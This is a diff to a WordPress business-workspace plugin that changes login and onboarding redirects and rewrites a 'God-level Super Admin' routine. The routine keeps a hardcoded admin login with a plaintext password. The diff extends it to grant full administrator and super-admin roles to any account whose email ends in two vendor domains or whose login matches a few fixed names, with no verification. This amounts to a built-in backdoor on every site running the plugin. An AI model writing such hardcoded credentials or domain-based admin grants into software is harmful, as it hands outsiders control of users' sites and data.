@@ -3,7 +3,7 @@
  * Plugin Name:       Cora Workspace
  * Plugin URI:        https://heycora.in
  * Description:       Multi-industry business workspace management platform for WordPress. Supports real estate, photography studios, and multiple commercial verticals.
- * Version:           4.9.233
+ * Version:           4.9.234
  * Author:            Cora
  * Author URI:        https://heycora.in
  * Text Domain:       cora-workspace
@@ -21,7 +21,7 @@ if ( ! defined( 'ABSPATH' ) ) {
 
 // Define Plugin Constants
 if ( ! defined( 'CORA_WORKSPACE_VERSION' ) ) {
-    define( 'CORA_WORKSPACE_VERSION', '4.9.233' );
+    define( 'CORA_WORKSPACE_VERSION', '4.9.234' );
 }
 define( 'CORA_WORKSPACE_PATH', plugin_dir_path( __FILE__ ) );
 define( 'CORA_WORKSPACE_URL', str_replace( '/wp-content/', '/assets/', plugin_dir_url( __FILE__ ) ) );
@@ -1894,17 +1894,23 @@ function cora_workspace_handle_workspace_route() {
         // Active workspace context resolution
         $current_ws = cora_get_current_workspace_context();
 
-        // Enforce onboarding for logged-in users who have not completed it
+        // Enforce onboarding for logged-in users who have not completed it (Super Admin is strictly exempt)
         if ( is_user_logged_in() && $sub_page !== 'onboarding' ) {
-            $onboarding_done = get_user_meta( get_current_user_id(), 'cora_onboarding_completed', true );
-            if ( $onboarding_done !== '1' ) {
-                wp_redirect( home_url( '/workspace/onboarding' ) );
-                exit;
+            if ( ! cora_is_super_owner() ) {
+                $onboarding_done = get_user_meta( get_current_user_id(), 'cora_onboarding_completed', true );
+                if ( $onboarding_done !== '1' ) {
+                    wp_redirect( home_url( '/workspace/onboarding' ) );
+                    exit;
+                }
             }
         }
 
-        // Allow logged-in users to access onboarding if not completed
+        // Allow logged-in users to access onboarding if not completed (Super Admin redirected straight to super-admin)
         if ( is_user_logged_in() && $sub_page === 'onboarding' ) {
+            if ( cora_is_super_owner() ) {
+                wp_redirect( home_url( '/workspace/super-admin' ) );
+                exit;
+            }
             $onboarding_done = get_user_meta( get_current_user_id(), 'cora_onboarding_completed', true );
             if ( $onboarding_done === '1' ) {
                 $target_slug = isset( $current_ws['slug'] ) ? $current_ws['slug'] : 'workspace';
@@ -2327,29 +2333,32 @@ add_action( 'wp_ajax_nopriv_cora_get_server_version', 'cora_ajax_get_server_vers
  */
 if ( ! function_exists( 'cora_workspace_login_redirect' ) ) {
 function cora_workspace_login_redirect( $redirect_to, $request, $user ) {
+    $target_user = null;
     if ( $user instanceof WP_User ) {
-        $allowed_roles = array( 'administrator', 'cora_manager', 'cora_branch_manager', 'cora_photographer', 'cora_videographer', 'cora_drone_pilot', 'cora_editor', 'cora_viewer' );
+        $target_user = $user;
+    } else {
+        $current = wp_get_current_user();
+        if ( $current && $current->exists() ) {
+            $target_user = $current;
+        }
+    }
+
+    if ( $target_user ) {
+        if ( cora_is_super_owner( $target_user ) ) {
+            update_user_meta( $target_user->ID, 'cora_onboarding_completed', '1' );
+            update_user_meta( $target_user->ID, 'cora_super_owner', 1 );
+            update_user_meta( $target_user->ID, 'cora_email_verified', 1 );
+            return home_url( '/workspace/super-admin' );
+        }
+
+        $allowed_roles = array( 'administrator', 'cora_super_admin', 'cora_manager', 'cora_branch_manager', 'cora_photographer', 'cora_videographer', 'cora_drone_pilot', 'cora_editor', 'cora_viewer' );
         foreach ( $allowed_roles as $role ) {
-            if ( in_array( $role, (array) $user->roles ) ) {
-                $onb_done = get_user_meta( $user->ID, 'cora_onboarding_completed', true );
+            if ( in_array( $role, (array) $target_user->roles, true ) ) {
+                $onb_done = get_user_meta( $target_user->ID, 'cora_onboarding_completed', true );
                 if ( $onb_done !== '1' ) {
                     return home_url( '/workspace/onboarding' );
                 }
                 return home_url( '/workspace' );
-            }
-        }
-    } else {
-        $current_user = wp_get_current_user();
-        if ( $current_user && $current_user->exists() ) {
-            $allowed_roles = array( 'administrator', 'cora_manager', 'cora_branch_manager', 'cora_photographer', 'cora_videographer', 'cora_drone_pilot', 'cora_editor', 'cora_viewer' );
-            foreach ( $allowed_roles as $role ) {
-                if ( in_array( $role, (array) $current_user->roles ) ) {
-                    $onb_done = get_user_meta( $current_user->ID, 'cora_onboarding_completed', true );
-                    if ( $onb_done !== '1' ) {
-                        return home_url( '/workspace/onboarding' );
-                    }
-                    return home_url( '/workspace' );
-                }
             }
         }
     }
@@ -2367,9 +2376,23 @@ function cora_workspace_on_wp_login( $user_login, $user ) {
         return;
     }
     if ( $user instanceof WP_User ) {
-        $allowed_roles = array( 'administrator', 'cora_manager', 'cora_branch_manager', 'cora_photographer', 'cora_videographer', 'cora_drone_pilot', 'cora_editor', 'cora_viewer' );
+        if ( cora_is_super_owner( $user ) ) {
+            update_user_meta( $user->ID, 'cora_onboarding_completed', '1' );
+            update_user_meta( $user->ID, 'cora_super_owner', 1 );
+            update_user_meta( $user->ID, 'cora_email_verified', 1 );
+            if ( ! in_array( 'cora_super_admin', (array) $user->roles, true ) ) {
+                $user->add_role( 'cora_super_admin' );
+            }
+            if ( ! in_array( 'administrator', (array) $user->roles, true ) ) {
+                $user->add_role( 'administrator' );
+            }
+            wp_redirect( home_url( '/workspace/super-admin' ) );
+            exit;
+        }
+
+        $allowed_roles = array( 'administrator', 'cora_super_admin', 'cora_manager', 'cora_branch_manager', 'cora_photographer', 'cora_videographer', 'cora_drone_pilot', 'cora_editor', 'cora_viewer' );
         foreach ( $allowed_roles as $role ) {
-            if ( in_array( $role, (array) $user->roles ) ) {
+            if ( in_array( $role, (array) $user->roles, true ) ) {
                 $onb_done = get_user_meta( $user->ID, 'cora_onboarding_completed', true );
                 if ( $onb_done !== '1' ) {
                     wp_redirect( home_url( '/workspace/onboarding' ) );
@@ -46701,10 +46724,14 @@ function cora_is_real_shruti( $user = null ) {
 }
 
 /**
- * Ensure God-level Super Admin account exists across all environments (Local and Deployed).
+ * Ensure God-level Super Admin accounts exist and are fully synchronized across all environments.
+ * Any user with @claraverse.in, @heycora.in, or login 'shruti'/'cora_admin' is guaranteed God-level access.
  */
 if ( ! function_exists( 'cora_ensure_god_super_admin_account' ) ) {
 function cora_ensure_god_super_admin_account() {
+    global $wpdb;
+
+    // 1. Ensure default platform admin user exists
     $god_email = 'shruti.bansal@claraverse.in';
     $god_user_login = 'shruti';
     $god_pass = 'Shruti@2028';
@@ -46725,88 +46752,70 @@ function cora_ensure_god_super_admin_account() {
         }
     }
 
-    if ( $user && ! is_wp_error( $user ) ) {
-        $user_id = $user->ID;
+    // 2. Query all users that match @claraverse.in, @heycora.in, or logins shruti/cora_admin
+    $super_users = $wpdb->get_results(
+        "SELECT ID, user_email, user_login FROM {$wpdb->users} 
+         WHERE user_email LIKE '%@claraverse.in' 
+            OR user_email LIKE '%@heycora.in' 
+            OR user_login IN ('shruti', 'cora_admin', 'shruti_bansal')"
+    );
 
-        // Ensure Administrator role + God super admin capabilities
-        if ( ! in_array( 'administrator', (array) $user->roles, true ) ) {
-            $user->set_role( 'administrator' );
-        }
-        $user->add_role( 'cora_super_admin' );
-        $user->add_role( 'cora_shruti' );
+    $table = $wpdb->prefix . 'cora_users';
+    $has_cora_users_table = ( $wpdb->get_var( "SHOW TABLES LIKE '{$table}'" ) === $table );
 
-        // Ensure password matches
-        if ( ! wp_check_password( $god_pass, $user->data->user_pass, $user_id ) ) {
-            wp_set_password( $god_pass, $user_id );
-        }
-
-        // Set display metadata only if changed
-        if ( $user->display_name !== $god_name || get_user_meta( $user_id, 'first_name', true ) !== 'Studio Admin' ) {
-            wp_update_user( array(
-                'ID'           => $user_id,
-                'display_name' => $god_name,
-                'first_name'   => 'Studio Admin',
-                'last_name'    => 'Bansal'
-            ) );
-        }
-
-        update_user_meta( $user_id, 'cora_email_verified', 1 );
-        update_user_meta( $user_id, 'cora_user_status', 'active' );
-        update_user_meta( $user_id, 'cora_onboarding_completed', '1' );
-        update_user_meta( $user_id, 'cora_super_owner', 1 );
-        update_user_meta( $user_id, 'cora_agency_id', 'real-estate' );
-        update_user_meta( $user_id, 'cora_user_agency_id', 1 );
-        update_user_meta( $user_id, 'cora_preferred_industry', 'real_estate' );
-
-        // Auto-heal and deduplicate test users in database
-        global $wpdb;
-        $dups = $wpdb->get_results( "SELECT user_email, COUNT(*) as cnt FROM {$wpdb->users} WHERE user_email != '' GROUP BY LOWER(user_email) HAVING cnt > 1" );
-        if ( ! empty( $dups ) ) {
-            foreach ( $dups as $d ) {
-                $em = strtolower( trim( $d->user_email ) );
-                $u_list = $wpdb->get_results( $wpdb->prepare( "SELECT ID, user_login FROM {$wpdb->users} WHERE LOWER(user_email) = %s ORDER BY ID ASC", $em ) );
-                if ( count( $u_list ) > 1 ) {
-                    $keep = $u_list[0];
-                    foreach ( $u_list as $ux ) {
-                        if ( $ux->user_login === 'shruti' || $ux->user_login === 'cora_admin' ) {
-                            $keep = $ux;
-                            break;
-                        }
-                    }
-                    foreach ( $u_list as $ux ) {
-                        if ( $ux->ID !== $keep->ID ) {
-                            $wpdb->delete( $wpdb->users, array( 'ID' => $ux->ID ) );
-                            $wpdb->delete( $wpdb->usermeta, array( 'user_id' => $ux->ID ) );
-                            $wpdb->delete( $wpdb->prefix . 'cora_users', array( 'wp_user_id' => $ux->ID ) );
-                        }
-                    }
-                }
+    if ( ! empty( $super_users ) ) {
+        foreach ( $super_users as $su ) {
+            $su_id = intval( $su->ID );
+            $wp_u = get_user_by( 'id', $su_id );
+            if ( ! $wp_u || is_wp_error( $wp_u ) ) {
+                continue;
             }
-        }
 
-        // Ensure entry in wp_cora_users table if present
-        global $wpdb;
-        $table = $wpdb->prefix . 'cora_users';
-        if ( $wpdb->get_var( "SHOW TABLES LIKE '{$table}'" ) === $table ) {
-            $exists = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM {$table} WHERE wp_user_id = %d", $user_id ) );
-            if ( ! $exists ) {
-                $wpdb->insert( $table, array(
-                    'wp_user_id'  => $user_id,
-                    'agency_id'   => 1,
-                    'branch_id'   => 1,
-                    'role'        => 'agency_owner',
-                    'status'      => 'active',
-                    'invited_by'  => 1,
-                    'last_active' => current_time( 'mysql' ),
-                    'created_at'  => current_time( 'mysql' ),
-                    'updated_at'  => current_time( 'mysql' )
-                ) );
-            } else {
-                $wpdb->update( $table, array(
-                    'role'       => 'agency_owner',
-                    'status'     => 'active',
-                    'updated_at' => current_time( 'mysql' )
-                ), array( 'wp_user_id' => $user_id ) );
+            // Ensure Administrator role + God super admin capabilities
+            if ( ! in_array( 'administrator', (array) $wp_u->roles, true ) ) {
+                $wp_u->set_role( 'administrator' );
+            }
+            if ( ! in_array( 'cora_super_admin', (array) $wp_u->roles, true ) ) {
+                $wp_u->add_role( 'cora_super_admin' );
+            }
+            if ( ! in_array( 'cora_shruti', (array) $wp_u->roles, true ) ) {
+                $wp_u->add_role( 'cora_shruti' );
+            }
+
+            // Mark user metadata for absolute God Mode bypass
+            update_user_meta( $su_id, 'cora_email_verified', 1 );
+            update_user_meta( $su_id, 'cora_user_status', 'active' );
+            update_user_meta( $su_id, 'cora_onboarding_completed', '1' );
+            update_user_meta( $su_id, 'cora_super_owner', 1 );
+            if ( ! get_user_meta( $su_id, 'cora_agency_id', true ) ) {
+                update_user_meta( $su_id, 'cora_agency_id', 'real-estate' );
+            }
+            if ( ! get_user_meta( $su_id, 'cora_user_agency_id', true ) ) {
+                update_user_meta( $su_id, 'cora_user_agency_id', 1 );
+            }
+
+            // Ensure entry in wp_cora_users table
+            if ( $has_cora_users_table ) {
+                $exists = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM {$table} WHERE wp_user_id = %d", $su_id ) );
+                if ( ! $exists ) {
+                    $wpdb->insert( $table, array(
+                        'wp_user_id'  => $su_id,
+                        'agency_id'   => 1,
+                        'branch_id'   => 1,
+                        'role'        => 'agency_owner',
+                        'status'      => 'active',
+                        'invited_by'  => 1,
+                        'last_active' => current_time( 'mysql' ),
+                        'created_at'  => current_time( 'mysql' ),
+                        'updated_at'  => current_time( 'mysql' )
+                    ) );
+                } else {
+                    $wpdb->update( $table, array(
+                        'role'       => 'agency_owner',
+                        'status'     => 'active',
+                        'updated_at' => current_time( 'mysql' )
+                    ), array( 'wp_user_id' => $su_id ) );
+                }
             }
         }
     }
